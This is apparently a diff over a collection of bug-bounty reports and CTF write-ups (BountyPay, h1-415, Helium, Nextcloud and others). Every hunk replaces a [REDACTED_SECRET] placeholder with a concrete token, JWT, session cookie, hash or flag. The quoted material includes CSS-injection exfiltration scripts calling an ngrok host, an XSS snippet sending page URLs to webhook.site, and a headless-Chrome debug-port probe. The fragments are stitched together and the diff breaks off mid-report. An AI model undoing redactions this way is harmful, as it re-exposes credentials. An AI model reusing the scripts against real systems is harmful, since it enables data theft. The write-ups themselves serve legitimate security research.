-(I'm guessing the backend expects the exact string `X-Token: [REDACTED_SECRET]` and is not trimming for whitespaces the incoming string like backends would usually do)
+(I'm guessing the backend expects the exact string `X-Token: 8e9998ee3137ca9ade8f372739f062c1` and is not trimming for whitespaces the incoming string like backends would usually do)
 
 Now I'm in possession of 2 staff_id, thats when I remembered there was a hint on Hackerone's twitter, linking to Bountypay's twitter, that was following a *Sandra Allison* with a badge picture.
 
@@ -12865,7 +12865,7 @@ tampering with the username was not really interesting, but I noticed that chang
 Time to put the theory to a test :
 
 I first requested to change my avatar to `tab3 sendReport`, and got this cookie :
-`[REDACTED_SECRET]%3D%3D`
+`c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NVRQRFYrU2dnMzNuUWdXNk1ES1pXSDBXdTU4QlZPMS80UEh1WUJZdFoyVTlGa0IvbFdqUThBYjF6MFU0Q3cxcW9RbkdRVnE2OFd3UjZvQUFScFMveS92VURmZlFqdjZ1U1pSU3JlcHVQYXEzRUFFeFgwOGorMTcxcA%3D%3D`
 Now, let's use this cookie and request :
 `https://staff.bountypay.h1ctf.com/?template=ticket&ticket_id=3582#tab3`
 
@@ -12901,7 +12901,7 @@ We get the same 2FA we have had on step2, let's bypass it the same way using mag
 
 We're on home as marten.mickos now. If we still remember how the challenge started, the goal was to deliver the May payments to hackers, so there will probably be a transaction if we request the statements for `05/2020`, and there is :
 
-`"Transactions for 2020-05\",\"transactions\":[{\"id\":17538771,\"hash\":\"[REDACTED_SECRET]\",\"hackers\":272,\"programs\":84,\"reports\":270,\"amount\":\"$210,300\"}]}"}`
+`"Transactions for 2020-05\",\"transactions\":[{\"id\":17538771,\"hash\":\"27cd1393c170e1e97f9507a5351ea1ba\",\"hackers\":272,\"programs\":84,\"reports\":270,\"amount\":\"$210,300\"}]}"}`
 
 So now we need to get the payments done right ? in the `app.js` there is this code :
 ```javascript
@@ -12950,12 +12950,12 @@ import requests
 from bs4 import BeautifulSoup
 
 
-url_challenge = 'https://app.bountypay.h1ctf.com/pay/17538771/[REDACTED_SECRET]'
+url_challenge = 'https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba'
 
 post = {'app_style': 'https%3A%2F%2F4291e5a07787.ngrok.io%2Fselector.css'}
 challenge = ''
 while not challenge.startswith('0e'):
-    x = requests.post(url_challenge, data = post, cookies = {"token": "[REDACTED_SECRET]"})
+    x = requests.post(url_challenge, data = post, cookies = {"token": "eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9"})
     soup = BeautifulSoup(x.text, 'html.parser')
     challs = soup.find_all("input")[0:2]
     for val in challs:
@@ -12966,7 +12966,7 @@ while not challenge.startswith('0e'):
 I was left with the app_style field that was sent in the POST request and that contained a CSS file url :
 `app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css`
 
-I remembered reading about CSS injection in a [blog post](https://medium.com/bugbountywriteup/[REDACTED_SECRET]) from D0nut, but never exploited it before.
+I remembered reading about CSS injection in a [blog post](https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d) from D0nut, but never exploited it before.
 I read again the blog post, and figured the challenge answer I was looking for was probably pretty much like a csrf token, as an `input` div with `type=hidden`.
 
 After hosting a CSS file containing basic payloads from the blog post, I was able to get a callback on a url, then I started thinking about how to get the name of the field I was searching for :
@@ -12998,8 +12998,8 @@ I wrote yet another python script to help me get the name of the field I was sea
 import requests
 from bs4 import BeautifulSoup
 
-alphabet = '[REDACTED_SECRET]'
-url_challenge = 'https://app.bountypay.h1ctf.com/pay/17538771/[REDACTED_SECRET]'
+alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+url_challenge = 'https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba'
 url_local = 'https://4291e5a07787.ngrok.io'
 for c in alphabet:
     css_payload = 'input[name^=""] ~ * { background-image: url("https://4291e5a07787.ngrok.io/1/'+ c +'"); }'
@@ -13007,7 +13007,7 @@ for c in alphabet:
     f.write(css_payload)
     f.close()
     post = {'app_style': 'https://4291e5a07787.ngrok.io/selector.css'}
-    x = requests.post(url_challenge, data = post, cookies = {"token": "[REDACTED_SECRET]"})
+    x = requests.post(url_challenge, data = post, cookies = {"token": "eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9"})
     print("testing : " + css_payload)
 ```
 
@@ -13023,8 +13023,8 @@ so I figured I needed to create a css file containing every line I needed to get
 import requests
 from bs4 import BeautifulSoup
 
-alphabet = '[REDACTED_SECRET]-+'
-url_challenge = 'https://app.bountypay.h1ctf.com/pay/17538771/[REDACTED_SECRET]'
+alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-+'
+url_challenge = 'https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba'
 url_local = 'https://4291e5a07787.ngrok.io'
 for i in range(1,6):
     for c in alphabet:
@@ -13047,7 +13047,7 @@ When I did get the 6 characters, I instantly sent the request to the burp intrud
 {F859889} 
 
 The final flag is :
-`^FLAG^[REDACTED_SECRET]$FLAG$`
+`^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`
 
 In a little bit less than 4 days working on this ctf, I finally worked my way through it. It was really interesting, and the 2 last parts were really challenging, especially for me since I'm not really good with clientside bugs. As well, I'm used to CTF and it was nice having all the steps to complete one by one rather than a classic jeopardy style where challenges aren't connected one to another.
 
@@ -13100,7 +13100,7 @@ So, I first searched on `https://crt.sh/?q=%25.bountypay.h1ctf.com` and that was
 
 {F863483}
 
-After saved the subdomains to one file, I ran [FFUF](https://github.com/ffuf/ffuf) with a small wordlist ([common.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/[REDACTED_SECRET]/Discovery/Web-Content/common.txt)) against them, with the objective to find hidden paths:
+After saved the subdomains to one file, I ran [FFUF](https://github.com/ffuf/ffuf) with a small wordlist ([common.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/0a39d3dcb46c3f3412e7199d634c7cf52ef04c0b/Discovery/Web-Content/common.txt)) against them, with the objective to find hidden paths:
 
 ```sh
 $ for subodomain in $(cat subdomains.txt); do ffuf -u "https://${subodomain}/FUZZ" -w common.txt -mc 200,301; done
@@ -13163,7 +13163,7 @@ Seeing the results, I got the url and I was able to download the apk file in `ht
 
 {F863511}
 
-For the Android APP, I use [jadx-gui](https://github.com/skylot/jadx) for decompile and [genymotion](https://www.genymotion.com/) + [adb](https://developer.android.com/studio/command-line/adb/?gclid=[REDACTED_SECRET]&gclsrc=aw.ds) like always. 
+For the Android APP, I use [jadx-gui](https://github.com/skylot/jadx) for decompile and [genymotion](https://www.genymotion.com/) + [adb](https://developer.android.com/studio/command-line/adb/?gclid=Cj0KCQjwiYL3BRDVARIsAF9E4GefdiEZsaDpxxw7mi_5dI6vRa6_PJ1mhj1QxpcPveu2K6ki2QuQCp8aArxZEALw_wcB&gclsrc=aw.ds) like always. 
 
 So, I installed the app with adb: 
 
@@ -13286,7 +13286,7 @@ Starting: Intent { act=android.intent.action.VIEW dat=one://part?start=PartTwoAc
 The lights came on:
 {F863520}
 
-For the second part of the activity, I decided not complicate the reversing process, so, [I setuped a debugger for smagli code](https://medium.com/@ghxst.dev/[REDACTED_SECRET]):
+For the second part of the activity, I decided not complicate the reversing process, so, [I setuped a debugger for smagli code](https://medium.com/@ghxst.dev/static-analysis-and-debugging-on-android-using-smalidea-jdwp-and-adb-b073e6b9ae48):
 tl;dr; Basically you from the APK generate the smagli source code to attatch the Android Process and debug the apk. 
 
 After the setup, I only needed to put a breakpoint and see the other value of the equal :) 
@@ -13396,7 +13396,7 @@ $ adb shell cat /data/data/bounty.pay/shared_prefs/user_created.xml
     <string name="HOST">http://api.bountypay.h1ctf.com</string>
     <string name="PARTONE">COMPLETE</string>
     <string name="TWITTERHANDLE">_0xfd_</string>
-    <string name="TOKEN">[REDACTED_SECRET]</string>
+    <string name="TOKEN">8e9998ee3137ca9ade8f372739f062c1</string>
 </map
 ```
 
@@ -13404,7 +13404,7 @@ To finish the Android Challenge step, I wrote the leaked token in the EditText, 
 
 {F863528}
 
-So now, I had directly access to `https://api.bountypay.h1ctf.com` just adding `X-Token: [REDACTED_SECRET]` in the request's header.
+So now, I had directly access to `https://api.bountypay.h1ctf.com` just adding `X-Token: 8e9998ee3137ca9ade8f372739f062c1` in the request's header.
 
 {F863529}
 
@@ -13476,7 +13476,7 @@ I only needed to intercept one report request, replace the url value with my enc
 
 {F863547}
 
-Note: `[REDACTED_SECRET]=` is the base64 value of my payload. I encoded the injection because the endpoint works in this way.
+Note: `aHR0cHM6Ly9zdGFmZi5ib3VudHlwYXkuaDFjdGYuY29tLz90ZW1wbGF0ZVtdPXRpY2tldCZ0aWNrZXRfaWQ9MzU4MiZ0ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjQ=` is the base64 value of my payload. I encoded the injection because the endpoint works in this way.
 
 {F863548}
 
@@ -13493,7 +13493,7 @@ But wild 2Fa appeared :/
 I tried to bypass in the same way but of course, it didn't work.
 So, after a few minutes analizing the situation I discovered that the request send as a parameter a css resource:
 ```
-POST /pay/17538771/[REDACTED_SECRET] HTTP/1.1
+POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
 Host: app.bountypay.h1ctf.com
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
@@ -13503,8 +13503,8 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 73
 Origin: https://app.bountypay.h1ctf.com
 Connection: close
-Referer: https://app.bountypay.h1ctf.com/pay/17538771/[REDACTED_SECRET]
-Cookie: token=[REDACTED_SECRET]
+Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
+Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9
 Upgrade-Insecure-Requests: 1
 
 app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
@@ -13512,7 +13512,7 @@ app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
 
 The first thing that I tried was change the `app_style` value with the url of my Burp Collaborator, and it worked! The collaborator recieved the request.
 Now, I only needed to discover the way how to get the 2FA code with a CSS... 
-I saw a few months ago something like ["Extract data via CSS Injection"](https://medium.com/bugbountywriteup/[REDACTED_SECRET]), so I try something simillar in this case, but for that, I needed to host a css file with an SSL conection.
+I saw a few months ago something like ["Extract data via CSS Injection"](https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d), so I try something simillar in this case, but for that, I needed to host a css file with an SSL conection.
 After some search, I discovered that I could host my own page with `https://pages.github.com/`. Then, I created a repository and host my CSS file, ready for the injection.
 First of all, I needed to know what kind of HTTP tags the page used:
 
@@ -13733,7 +13733,7 @@ Connection: close
 Content-Length: 488
 accept: */*
 Sec-Fetch-Dest: empty
-authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.[REDACTED_SECRET].-[REDACTED_SECRET]
+authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQxMTQ0LCJpYXQiOjE1ODMyNTQ3NDQsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIzNzQ4ZmJkYS1iMjhiLTRlOWYtOThiMy00ZTUzMGRlYWEwNmMiLCJuYmYiOjE1ODMyNTQ3NDMsIm9yZ2FuaXphdGlvbiI6IjkxNmE3NmJmLWM3ZmEtNDkxYi1hZjAyLTY3NGY5YWYwZTFhMyIsIm9yZ2FuaXphdGlvbl9uYW1lIjoidGVzdGhhY2tlcm9uZSIsInN1YiI6IjU1OTQ2ZDBlLTBhOTAtNGQ0ZC05ZGI4LTEyMjM2MmY1Nzc1NiIsInR5cCI6ImFjY2VzcyJ9.-1VwG72225yPkZ0BimNSw_DFURRlT8Wh-AcAuDXgJFEEfiPduEdWcwwxY6-oQEHx8ILFUlxQYdbduYiTA-D79Q
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
 content-type: application/json
 Origin: https://console.helium.com
@@ -13742,7 +13742,7 @@ Sec-Fetch-Mode: cors
 Referer: https://console.helium.com/users
 Accept-Encoding: gzip, deflate
 Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
-Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.[REDACTED_SECRET]; [REDACTED_SECRET].com=[REDACTED_SECRET]
+Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI1NTk0NmQwZS0wYTkwLTRkNGQtOWRiOC0xMjIzNjJmNTc3NTYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODMyNDYzMzc1MzksImxhc3RFdmVudFRpbWUiOjE1ODMyNTQ3NDg0OTgsImV2ZW50SWQiOjE5MywiaWRlbnRpZnlJZCI6NDEsInNlcXVlbmNlTnVtYmVyIjoyMzR9
 
 {"operationName":"PaginatedMembershipsQuery","variables":{"page":1,"pageSize":10},"query":"query PaginatedMembershipsQuery($page: Int, $pageSize: Int) {\n  memberships(page: $page, pageSize: $pageSize) {\n    entries {\n      ...MembershipFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment MembershipFragment on Membership {\n  id\n  email\n  role\n  inserted_at\n  two_factor_enabled\n  __typename\n}\n"}
 ```
@@ -13769,7 +13769,7 @@ Connection: close
 Content-Length: 31
 accept: */*
 Sec-Fetch-Dest: empty
-authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.[REDACTED_SECRET].[REDACTED_SECRET]
+authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQxNTA0LCJpYXQiOjE1ODMyNTUxMDQsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiJkODIxNzAwYS0xMGE5LTQwOGItYjc3ZC01OGY5ODY2ZWFkZmUiLCJuYmYiOjE1ODMyNTUxMDMsIm9yZ2FuaXphdGlvbiI6IjZjNmM4YzhhLTQ5ZmUtNGJlZi1hMDBjLWZkOTliZWUzOWIwZCIsIm9yZ2FuaXphdGlvbl9uYW1lIjoiaGFja2Vyb25lIiwic3ViIjoiNTU5NDZkMGUtMGE5MC00ZDRkLTlkYjgtMTIyMzYyZjU3NzU2IiwidHlwIjoiYWNjZXNzIn0.r13Aj4TXYzLYJ7clq9gl_SbpdSnVZpUsj0rFtgIMMeUXAE-44iiReL8bffEy4414L6Ess-dOH5L7MFiT55GAqw
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
 content-type: application/json
 Origin: https://console.helium.com
@@ -13778,7 +13778,7 @@ Sec-Fetch-Mode: cors
 Referer: https://console.helium.com/users
 Accept-Encoding: gzip, deflate
 Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
-Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.[REDACTED_SECRET]; [REDACTED_SECRET].com=[REDACTED_SECRET]
+Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI1NTk0NmQwZS0wYTkwLTRkNGQtOWRiOC0xMjIzNjJmNTc3NTYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODMyNDYzMzc1MzksImxhc3RFdmVudFRpbWUiOjE1ODMyNTEwNzEwNDEsImV2ZW50SWQiOjEzOSwiaWRlbnRpZnlJZCI6MjksInNlcXVlbmNlTnVtYmVyIjoxNjh9
 
 {"membership":{"role":"admin"}}
 ```
@@ -13809,7 +13809,7 @@ Connection: close
 Content-Length: 488
 accept: */*
 Sec-Fetch-Dest: empty
-authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.[REDACTED_SECRET].[REDACTED_SECRET]
+authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQyMDk5LCJpYXQiOjE1ODMyNTU2OTksImlzcyI6ImNvbnNvbGUiLCJqdGkiOiI0YWM5ZDk2OC1hMGYwLTQ5MDgtODZmMi0wNTE3ZjE3OTE0NjMiLCJuYmYiOjE1ODMyNTU2OTgsIm9yZ2FuaXphdGlvbiI6IjkxNmE3NmJmLWM3ZmEtNDkxYi1hZjAyLTY3NGY5YWYwZTFhMyIsIm9yZ2FuaXphdGlvbl9uYW1lIjoidGVzdGhhY2tlcm9uZSIsInN1YiI6IjU1OTQ2ZDBlLTBhOTAtNGQ0ZC05ZGI4LTEyMjM2MmY1Nzc1NiIsInR5cCI6ImFjY2VzcyJ9.rShCG6pW0Pjkd_dd8KTslyKPU38jrzhMrn39dkxdIqhePsCFx4FsEmNSKXTNm2zD02dPZNkp_N_FGtcen8kaeQ
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
 content-type: application/json
 Origin: https://console.helium.com
@@ -13818,7 +13818,7 @@ Sec-Fetch-Mode: cors
 Referer: https://console.helium.com/users
 Accept-Encoding: gzip, deflate
 Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
-Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.[REDACTED_SECRET]; [REDACTED_SECRET].com=[REDACTED_SECRET]
+Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI1NTk0NmQwZS0wYTkwLTRkNGQtOWRiOC0xMjIzNjJmNTc3NTYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODMyNDYzMzc1MzksImxhc3RFdmVudFRpbWUiOjE1ODMyNTU3MDI0MTAsImV2ZW50SWQiOjIwMywiaWRlbnRpZnlJZCI6NDMsInNlcXVlbmNlTnVtYmVyIjoyNDZ9
 
 {"operationName":"PaginatedMembershipsQuery","variables":{"page":1,"pageSize":10},"query":"query PaginatedMembershipsQuery($page: Int, $pageSize: Int) {\n  memberships(page: $page, pageSize: $pageSize) {\n    entries {\n      ...MembershipFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment MembershipFragment on Membership {\n  id\n  email\n  role\n  inserted_at\n  two_factor_enabled\n  __typename\n}\n"}
 ```
@@ -14105,7 +14105,7 @@ Insecure direct object references in marketplace due to a length restrictions in
 
 **Vulnerability Information:**
 
-The mid-2019 announced feature "Secure view" (https://nextcloud.com/blog/[REDACTED_SECRET]/) allows for hiding the Download button on public shares.
+The mid-2019 announced feature "Secure view" (https://nextcloud.com/blog/secure-view-prevent-your-shared-files-from-getting-downloaded/) allows for hiding the Download button on public shares.
 Even though the announcement admits that there are always workarounds out there to get hands on the file anyway, the workaround for this one is way too simple: Just add **/download** to the URL (like you used to for every public share) and your browser starts downloading unhesitently.
 
 For the sharee, the checkbox "Hide Download" is therefore very deceptive, since they very likely weigh themselves in false safety.
@@ -14162,7 +14162,7 @@ Vulnerable request:
 POST /api/auth/facebook HTTP/1.1
 Host: reverb.com
 
-{"fb_token":"[REDACTED_SECRET]"}
+{"fb_token":"[REDACTED_FACEBOOK_TOKEN]"}
 ```
 Here in vulnerable i used lyst app access token to login.
 
@@ -14243,7 +14243,7 @@ To reproduce, the following GraphQL query can be used:
 
 ```
 query {
-  node(id: "[REDACTED_SECRET]") {
+  node(id: "Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS8x") {
     ... on StructuredScope {
       _id
       asset_identifier
@@ -14279,8 +14279,8 @@ HackerOne Pentesters, although having more access than normal users, can obtain 
 I found something interesting  with Headless chrome debugging in the last step, I am sure I am going to solve this after trying very hard for about a week, I don't know when this CTF is going to end, that's why I am submitting a summary of how to solve this so that I can write the full report after fully solving the final step.
 
 1. ATO of jobert's account using jobert@mydocz.cosmic
-2. CSP bypass using URL double encoding. `https://h1-415.h1ctf.com/support/chat?message=%3Cscript%20type=%22text/javascript%22%20src=%22https://raw.githack.com/mattboldt/typed.js/master/lib/typed.js/..%252f..%252f..%252f..%252f..%252fInvaders0/xss/[REDACTED_SECRET]/as.js%22%3E%3C/script%3E`
-3. IDOR to  update the name at review. ```http://localhost:3000/support/review/[REDACTED_SECRET]```
+2. CSP bypass using URL double encoding. `https://h1-415.h1ctf.com/support/chat?message=%3Cscript%20type=%22text/javascript%22%20src=%22https://raw.githack.com/mattboldt/typed.js/master/lib/typed.js/..%252f..%252f..%252f..%252f..%252fInvaders0/xss/81faa59004ebeee525502d38b302445be93a2131/as.js%22%3E%3C/script%3E`
+3. IDOR to  update the name at review. ```http://localhost:3000/support/review/c9b46d365357148bcd2436bc5d7fc19f27268010e91cd271b6531f8dff6824dc```
 4. Headless chrome debugging enabled (have to solve).
 
 ## Impact
@@ -14310,7 +14310,7 @@ var image = document.createElement("img")
 var image.src = "webhook.site/1234/img.png?url= + window.location.href
 document.body.appendChild(image)
 ``` 
-This allowed us to get the reviewer link to our conversation: `https://h1-415.h1ctf.com/support/review/[REDACTED_SECRET]` 
+This allowed us to get the reviewer link to our conversation: `https://h1-415.h1ctf.com/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd` 
 Once you had access to the form in the reviews there's a form the reviewer has access to, to edit the user's name, this parameter was vulnerable to an IDOR - so you could edit anyone's name, we created a second trial account and tried to change its name - it worked, next we noticed the pdf's the application was creating rendered the name of the user - with this information we tried to inject html into the name using the IDOR we found and it worked! html is rendering, let's make a request to our server so we can get more information about what's creating these pdfs, here I used https://ssrftest.com to test for SSRF - there's a payload to use an image and try to get a request back to the server - it works and the header's that are important to us here are `User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36` it tells us this is a headless browser Chrome running on linux, there's also a `Referer: http://localhost:3000/` so we know this is running behind a proxy - we spent a lot of time trying to figure out how to do the next thing - finally we started using an `iframe` to "peek" inside the application, trying ports, `80` returned `FORBIDDEN` and everything else we tried was blank, and then I remembered this was using `headless Chrome` so I used my google-fu and searched for `headless chrome port number` and the results were promising: 
 ```
 chrome \
@@ -14328,9 +14328,9 @@ but then we tried: `<iframe src='http://localhost:9222/json width=900 height=900
 
 we receive a json document with the important part being
 ```
-secret_document=[REDACTED_SECRET].pdf",   "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/[REDACTED_SECRET]"```
+secret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf",   "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/E20087FA03CA27A6E908AFD7E5321E88"```
 
-if you access: https://h1-415.h1ctf.com/documents/[REDACTED_SECRET].pdf
+if you access: https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf
 
 It is done! 
 
@@ -15394,7 +15394,7 @@ User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MOB31E; wv) AppleWe
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/wxpic,image/sharpp,image/apng,image/tpg,*/*;q=0.8
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,en-US;q=0.8
-Cookie: PHPSESSID=ip1f71qqak3kvakksu28bensjlapsh9a; Hm_lvt_b7c2e12efc764f8179148ddbece8211f=1545489448; [REDACTED_SECRET]=1545489448
+Cookie: PHPSESSID=ip1f71qqak3kvakksu28bensjlapsh9a; Hm_lvt_b7c2e12efc764f8179148ddbece8211f=1545489448; Hm_lpvt_b7c2e12efc764f8179148ddbece8211f=1545489448
 Connection: close
 
 ```
@@ -15475,7 +15475,7 @@ Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Referer: https://support.ratelimited.me/widget/chat.html?dpsid=583-5PH467W8RA2NCWJ&parent_url=https%3A%2F%2Fsupport.ratelimited.me%2Fprofile
 X-Requested-With: XMLHttpRequest
-Cookie: __cfduid=[REDACTED_SECRET]; dpsid=583-5PH467W8RA2NCWJ; dpvc=11941-DH6W43CBT3WHJQN; __unam=c0d18f2-16315a5f2ac-ba1665a-242; __utma=138098738.1674211735.1525076589.1525107067.1525114365.3; __utmc=138098738; __utmz=138098738.1525076589.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); dpvut=X635APM2; dpchat_sid=583-5PH467W8RA2NCWJ; __utmb=138098738.29.10.1525114365; __utmt=1; dpchatid=51
+Cookie: __cfduid=debed713d869308c24159d6b0ce4df2481525076018; dpsid=583-5PH467W8RA2NCWJ; dpvc=11941-DH6W43CBT3WHJQN; __unam=c0d18f2-16315a5f2ac-ba1665a-242; __utma=138098738.1674211735.1525076589.1525107067.1525114365.3; __utmc=138098738; __utmz=138098738.1525076589.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); dpvut=X635APM2; dpchat_sid=583-5PH467W8RA2NCWJ; __utmb=138098738.29.10.1525114365; __utmt=1; dpchatid=51
 Connection: close
 ```
 
@@ -15682,7 +15682,7 @@ APACHE_RUN_GROUP=www-data
 APACHE_LOG_DIR=/var/log/apache2
 PHPIZE_DEPS=autoconf 		dpkg-dev 		file 		g++ 		gcc 		libc-dev 		make 		pkg-config 		re2c
 PWD=/app
-PHP_SHA256=[REDACTED_SECRET]
+PHP_SHA256=01c2154a3a8e3c0818acbdbc1a956832c828a0380ce6d1d14fea495ea21804f0
 APACHE_ENVVARS=/etc/apache2/envvars
 DYNO=web.1
 ```
@@ -15759,13 +15759,13 @@ A good report almost always requires steps to reproduce. My apologies if this is
 
 1. Prepare the following serialized PHP-object  with a XXE payloadfor injection
 ```
